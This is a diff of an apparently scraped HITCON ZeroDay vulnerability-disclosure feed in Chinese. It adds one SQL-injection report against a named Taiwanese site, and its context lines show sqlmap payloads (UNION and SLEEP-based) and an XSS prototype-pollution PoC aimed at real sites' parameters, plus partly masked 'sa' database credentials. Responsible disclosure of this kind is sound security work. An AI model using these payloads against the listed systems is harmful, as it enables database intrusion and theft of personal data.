+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已審核
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       已通報
+      </span>
+     </div>
+    </li>
+    <li class="non-stop">
+     <div class="stat-tn-node warning">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       未回報修補狀況
+      </span>
+     </div>
+    </li>
+    <li class="non-stop">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       未複測
+      </span>
+     </div>
+    </li>
+    <li class="">
+     <div class="stat-tn-node">
+      <span class="stat-tn-date">
+      </span>
+      <span class="stat-tn-stat tx-overflow-ellipsis">
+       公開
+      </span>
+     </div>
+    </li>
+   </ul>
+   <h4 class="always-not-there">
+    處理歷程
+   </h4>
+   <div class="status-log" data-label-expand="點此顯示完整的處理歷程" data-label-fold="收合完整歷程" onclick="onClickToggleVulStatLog(event)">
+   </div>
+   <ul class="status-log-list" id="vul-status-log-list">
+    <li>
+     <span class="log-date">
+      2022/02/15 23:52:40
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      新提交 (由 癡情法王 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/02/18 14:22:23
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      審核完成 (由 HITCON ZeroDay 服務團隊 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/02/18 15:55:35
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      通報未回應 (由 HITCON ZeroDay 服務團隊 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/02/18 15:55:35
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      審核完成 (由 HITCON ZeroDay 服務團隊 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/02/18 15:55:35
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      通報未回應 (由 HITCON ZeroDay 服務團隊 更新此狀態)
+     </span>
+    </li>
+    <li>
+     <span class="log-date">
+      2022/04/17 03:00:02
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   詳細資料
+  </h3>
+  <div class="section-content info">
+   <ul>
+    <li>
+     ZDID：ZD-2022-00095
+    </li>
+    <li>
+     通報者：RoRo (
+     <a href="/user/RoRo">
+      癡情法王
+     </a>
+     )
+    </li>
+    <li>
+     風險：高
+    </li>
+    <li>
+     類型：資料庫注入攻擊 (SQL Injection)
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    攻擊者可利用該漏洞取得後端資料庫權限及完整資料（包含大量使用者個資或敏感性資料），同時也有機會對資料進行破壞或修改。
+    <br/>
+    <br/>
+    漏洞說明： OWASP - SQL Injection
+    <br/>
+    https://www.owasp.org/index.php/SQL_Injection
+    <br/>
+    <br/>
+    漏洞說明： OWASP - Top 10 - 2017 A1 - Injection
+    <br/>
+    https://www.owasp.org/index.php/Top_10-2017_A1-Injection
+    <br/>
+    <br/>
+    漏洞說明： CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
+    <br/>
+    https://cwe.mitre.org/data/definitions/89.html
+    <br/>
+    <br/>
+    防護方式： OWASP - SQL Injection Prevention Cheat Sheet
+    <br/>
+    https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    http://www.essf.com.tw/guestdshow.asp?msgid=3516
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <ol>
+     <li>
+      於問題URL中，將SQLi語法貼至guestdshow.asp的問題參數msgid，會對後端資料庫執行相關SQL指令
+     </li>
+     <li>
+      使用弱掃工具SqlMap掃描問題網址，至少可以列舉出DB中的table名稱，漏洞資訊如下：
+      <br/>
+      +++
+      <br/>
+      Parameter: msgid (GET)
+      <br/>
+      Type: boolean-based blind
+      <br/>
+      Title: AND boolean-based blind - WHERE or HAVING clause
+      <br/>
+      Payload: msgid=3516 AND 7787=7787
+      <br/>
+      +++
+      <br/>
+      <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7258/attachments/a77e3c388ca91e12f2c639679849119f"/>
+     </li>
+    </ol>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   修補建議
+  </h3>
+  <div class="section-content zdui-md-content">
+   <p>
+    1. 針對所有GET/POST的所得到的變數(例如：msgid)，一定要在server side確認變數中沒有不合規的字元，例如：'、"、--、=、...等
+    <br>
+     2. 最好還能限制變數內容的字串長度、型別，並使用prepare statement來處理SQL語法的使用
+     <br>
+      3. 可google一下排除SQL injection的asp程式開發範例
+     </br>
+    </br>
+   </p>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7258/attachments/a77e3c388ca91e12f2c639679849119f" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   留言討論
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="comments-block" id="comments_block">
+    </div>
+    <div class="login-and-comment">
+     <a href="/auth/login">
+      登入後留言
+     </a>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/4147">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
+    </div>
+   </div>
+  </div>
+ </section>
+</div>
+</description><pubDate>Tue, 15 Feb 2022 23:52:40 GMT</pubDate></item><item><title>國立臺北科技大學電機工程系 存在 SQL injection</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00243</link><description><div class="container">
  <h2 class="always-not-there">
   Vulnerability Detail Report
  </h2>
@@ -890,7 +2337,7 @@ back-end DBMS: MySQL &gt;= 5.0.12</code></pre>
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="d28292a1a1a5e2a0b6" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="1b4b5b68686c2b697f" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -966,7 +2413,7 @@ back-end DBMS: MySQL &gt;= 5.0.12</code></pre>
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="540414272723642630">
+      <span class="__cf_email__" data-cfemail="8fdfcffcfcf8bffdeb">
        [email protected]
       </span>
      </a>
@@ -1248,7 +2695,7 @@ Payload: id=3 AND SLEEP(5)</code></pre>
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="4a1a0a39393d7a382e" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="045444777773347660" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -1324,7 +2771,7 @@ Payload: id=3 AND SLEEP(5)</code></pre>
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="bdedfdcececa8dcfd9">
+      <span class="__cf_email__" data-cfemail="3868784b4b4f084a5c">
        [email protected]
       </span>
      </a>
@@ -1726,7 +3173,7 @@ Payload: id=5' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b767171,0x6
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="4e1e0e3d3d397e3c2a" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="035343707074337167" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -1802,7 +3249,7 @@ Payload: id=5' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b767171,0x6
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="f6a6b6858581c68492">
+      <span class="__cf_email__" data-cfemail="95c5d5e6e6e2a5e7f1">
        [email protected]
       </span>
      </a>
@@ -2136,7 +3583,7 @@ Payload: oid=-4727' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="c89888bbbbbff8baac" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="114151626266216375" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -2151,7 +3598,7 @@ Payload: oid=-4727' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="6f3f2f1c1c185f1d0b" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="a5f5e5d6d6d295d7c1" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -2227,7 +3674,7 @@ Payload: oid=-4727' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="f4a4b4878783c48690">
+      <span class="__cf_email__" data-cfemail="7f2f3f0c0c084f0d1b">
        [email protected]
       </span>
      </a>
@@ -2571,7 +4018,7 @@ Payload: id=30 AND (SELECT 5066 FROM (SELECT(SLEEP(5)))IBvU)</code></pre>
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="0b5b4b78787c3b796f" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="c59585b6b6b2f5b7a1" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -2647,7 +4094,7 @@ Payload: id=30 AND (SELECT 5066 FROM (SELECT(SLEEP(5)))IBvU)</code></pre>
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="431303303034733127">
+      <span class="__cf_email__" data-cfemail="6f3f2f1c1c185f1d0b">
        [email protected]
       </span>
      </a>
@@ -3014,7 +4461,7 @@ Payload: id=-1675' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT('qkkzq','rvMnrlCr
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="7c2c3c0f0f0b4c0e18" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="feaebe8d8d89ce8c9a" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -3029,7 +4476,7 @@ Payload: id=-1675' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT('qkkzq','rvMnrlCr
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="114151626266216375" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="0d5d4d7e7e7a3d7f69" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -3044,7 +4491,7 @@ Payload: id=-1675' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT('qkkzq','rvMnrlCr
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="cb9b8bb8b8bcfbb9af" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="afffefdcdcd89fddcb" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -3120,7 +4567,7 @@ Payload: id=-1675' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT('qkkzq','rvMnrlCr
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="451505363632753721">
+      <span class="__cf_email__" data-cfemail="663626151511561402">
        [email protected]
       </span>
      </a>
@@ -3491,7 +4938,7 @@ Payload: MNum=7&amp;PCNum=1' UNION ALL SELECT NULL,NULL,NULL,'qvkjq'+'YnSrdtRyqj
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="560616252521662432" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="055545767672357761" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -3506,7 +4953,7 @@ Payload: MNum=7&amp;PCNum=1' UNION ALL SELECT NULL,NULL,NULL,'qvkjq'+'YnSrdtRyqj
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="d18191a2a2a6e1a3b5" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="edbdad9e9e9add9f89" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -3582,7 +5029,7 @@ Payload: MNum=7&amp;PCNum=1' UNION ALL SELECT NULL,NULL,NULL,'qvkjq'+'YnSrdtRyqj
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="1d4d5d6e6e6a2d6f79">
+      <span class="__cf_email__" data-cfemail="762636050501460412">
        [email protected]
       </span>
      </a>
@@ -4257,7 +5704,7 @@ Payload: id=-4912' UNION ALL SELECT NULL,CONCAT(0x7162786271,0x76427977747359524
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="f5a5b5868682c58791" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="1949596a6a6e296b7d" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -4333,7 +5780,7 @@ Payload: id=-4912' UNION ALL SELECT NULL,CONCAT(0x7162786271,0x76427977747359524
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="9cccdcefefebaceef8">
+      <span class="__cf_email__" data-cfemail="a8f8e8dbdbdf98dacc">
        [email protected]
       </span>
      </a>
@@ -4425,7 +5872,7 @@ Payload: id=-4912' UNION ALL SELECT NULL,CONCAT(0x7162786271,0x76427977747359524
      var $dbuser = "sa";
      <br/>
      var $dbpassword = "
-     <a class="__cf_email__" data-cfemail="b0f1dcdcc4dfc081f0" href="/cdn-cgi/l/email-protection">
+     <a class="__cf_email__" data-cfemail="3d7c515149524d0c7d" href="/cdn-cgi/l/email-protection">
       [email protected]
      </a>
      ***cc";
@@ -4442,7 +5889,7 @@ Payload: id=-4912' UNION ALL SELECT NULL,CONCAT(0x7162786271,0x76427977747359524
      var $username = "sa";
      <br/>
      var $password = "
-     <a class="__cf_email__" data-cfemail="6e2f02021a011e5f2e" href="/cdn-cgi/l/email-protection">
+     <a class="__cf_email__" data-cfemail="e9a885859d8699d8a9" href="/cdn-cgi/l/email-protection">
       [email protected]
      </a>
      ***cc";
@@ -7807,7 +9254,7 @@ xss 原型污染 PoC payload
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="075747747470377563" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="c59585b6b6b2f5b7a1" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -7822,7 +9269,7 @@ xss 原型污染 PoC payload
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="4818083b3b3f783a2c" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="336373404044034157" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -7898,7 +9345,7 @@ xss 原型污染 PoC payload
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="2979695a5a5e195b4d">
+      <span class="__cf_email__" data-cfemail="d98999aaaaaee9abbd">
        [email protected]
       </span>
      </a>
@@ -11110,7 +12557,7 @@ xss 原型汙染 PoC payload : ";$.extend(true,{},JSON.parse('{"__proto__":{"z":
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="035343707074337167" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="2878685b5b5f185a4c" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -11197,7 +12644,7 @@ xss 原型汙染 PoC payload : ";$.extend(true,{},JSON.parse('{"__proto__":{"z":
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="cd9d8dbebebafdbfa9">
+      <span class="__cf_email__" data-cfemail="e8b8a89b9b9fd89a8c">
        [email protected]
       </span>
      </a>
@@ -13955,7 +15402,7 @@ Payload: user_id=-3220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="c49484b7b7b3f4b6a0" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="104050636367206274" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -13970,7 +15417,7 @@ Payload: user_id=-3220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="8bdbcbf8f8fcbbf9ef" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="366676454541064452" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -13985,7 +15432,7 @@ Payload: user_id=-3220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="2d7d6d5e5e5a1d5f49" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="9bcbdbe8e8ecabe9ff" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -14061,7 +15508,7 @@ Payload: user_id=-3220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="336373404044034157">
+      <span class="__cf_email__" data-cfemail="dc8c9cafafabecaeb8">
        [email protected]
       </span>
      </a>
@@ -16127,7 +17574,7 @@ Payload: tp=bus&amp;newid=1415 UNION ALL SELECT CHAR(113)+CHAR(113)+CHAR(120)+CH
      <br/>
      可取得當前資料庫使用者名:
      <code>
-      <a class="__cf_email__" data-cfemail="b0c7dfc2dbc3d8dfc0f081809e8183809e809e86" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="3e49514c554d56514e7e0f0e100f0d0e100e1008" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
      </code>
@@ -17387,7 +18834,7 @@ Payload: tp=bus&amp;newid=1415 UNION ALL SELECT CHAR(113)+CHAR(113)+CHAR(120)+CH
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="530313202024632137" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="1e4e5e6d6d692e6c7a" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -17463,7 +18910,7 @@ Payload: tp=bus&amp;newid=1415 UNION ALL SELECT CHAR(113)+CHAR(113)+CHAR(120)+CH
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="cb9b8bb8b8bcfbb9af">
+      <span class="__cf_email__" data-cfemail="663626151511561402">
        [email protected]
       </span>
      </a>
@@ -21418,7 +22865,7 @@ Payload: id=-4523' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="c79787b4b4b0f7b5a3" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="174757646460276573" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -21433,7 +22880,7 @@ Payload: id=-4523' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="530313202024632137" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="d58595a6a6a2e5a7b1" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -21448,7 +22895,7 @@ Payload: id=-4523' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="a8f8e8dbdbdf98dacc" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="3868784b4b4f084a5c" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -21463,7 +22910,7 @@ Payload: id=-4523' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="b1e1f1c2c2c681c3d5" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="207060535357105244" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -21478,7 +22925,7 @@ Payload: id=-4523' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="277767545450175543" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="b4e4f4c7c7c384c6d0" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -21554,7 +23001,7 @@ Payload: id=-4523' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="174757646460276573">
+      <span class="__cf_email__" data-cfemail="f4a4b4878783c48690">
        [email protected]
       </span>
      </a>
@@ -21859,7 +23306,7 @@ Payload: products_keyword=w') AND (SELECT 9515 FROM (SELECT(SLEEP(5)))JQYj) AND 
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="d08090a3a3a7e0a2b4" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="90c0d0e3e3e7a0e2f4" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -21935,7 +23382,7 @@ Payload: products_keyword=w') AND (SELECT 9515 FROM (SELECT(SLEEP(5)))JQYj) AND 
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="f8a8b88b8b8fc88a9c">
+      <span class="__cf_email__" data-cfemail="530313202024632137">
        [email protected]
       </span>
      </a>
@@ -22248,7 +23695,7 @@ Payload: class_id=2 AND (SELECT 1017 FROM (SELECT(SLEEP(5)))VvaB)</code></pre>
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="5d0d1d2e2e2a6d2f39" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="7a2a3a09090d4a081e" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -22324,7 +23771,7 @@ Payload: class_id=2 AND (SELECT 1017 FROM (SELECT(SLEEP(5)))VvaB)</code></pre>
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="540414272723642630">
+      <span class="__cf_email__" data-cfemail="eabaaa99999dda988e">
        [email protected]
       </span>
      </a>
@@ -22621,7 +24068,7 @@ Payload: upid=-9723 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="c29282b1b1b5f2b0a6" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="4818083b3b3f783a2c" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -22708,7 +24155,7 @@ Payload: upid=-9723 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="530313202024632137">
+      <span class="__cf_email__" data-cfemail="431303303034733127">
        [email protected]
       </span>
      </a>
@@ -23081,7 +24528,7 @@ Payload: account=IcNX' AND (SELECT 2582 FROM (SELECT(SLEEP(5)))eSyj) AND 'LXVA'=
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="d18191a2a2a6e1a3b5" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="104050636367206274" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -23157,7 +24604,7 @@ Payload: account=IcNX' AND (SELECT 2582 FROM (SELECT(SLEEP(5)))eSyj) AND 'LXVA'=
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="beeefecdcdc98eccda">
+      <span class="__cf_email__" data-cfemail="045444777773347660">
        [email protected]
       </span>
      </a>
@@ -23508,7 +24955,7 @@ Payload: record_id=-6065 UNION ALL SELECT NULL,CONCAT(0x71707a6271,0x5978506b494
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="7828380b0b0f480a1c" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="471707343430773523" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -23523,7 +24970,7 @@ Payload: record_id=-6065 UNION ALL SELECT NULL,CONCAT(0x71707a6271,0x5978506b494
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="95c5d5e6e6e2a5e7f1" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="89d9c9fafafeb9fbed" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -23538,7 +24985,7 @@ Payload: record_id=-6065 UNION ALL SELECT NULL,CONCAT(0x71707a6271,0x5978506b494
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="96c6d6e5e5e1a6e4f2" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="c89888bbbbbff8baac" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -23553,7 +25000,7 @@ Payload: record_id=-6065 UNION ALL SELECT NULL,CONCAT(0x71707a6271,0x5978506b494
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="3b6b7b48484c0b495f" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="c99989bababef9bbad" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -23629,7 +25076,7 @@ Payload: record_id=-6065 UNION ALL SELECT NULL,CONCAT(0x71707a6271,0x5978506b494
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="7f2f3f0c0c084f0d1b">
+      <span class="__cf_email__" data-cfemail="550515262622652731">
        [email protected]
       </span>
      </a>
@@ -24045,7 +25492,7 @@ Payload: site_map_item_id=478 AND (SELECT 2653 FROM (SELECT(SLEEP(5)))aVCj)</cod
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="174757646460276573" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="c39383b0b0b4f3b1a7" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -24060,7 +25507,7 @@ Payload: site_map_item_id=478 AND (SELECT 2653 FROM (SELECT(SLEEP(5)))aVCj)</cod
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="92c2d2e1e1e5a2e0f6" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="e2b2a2919195d29086" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
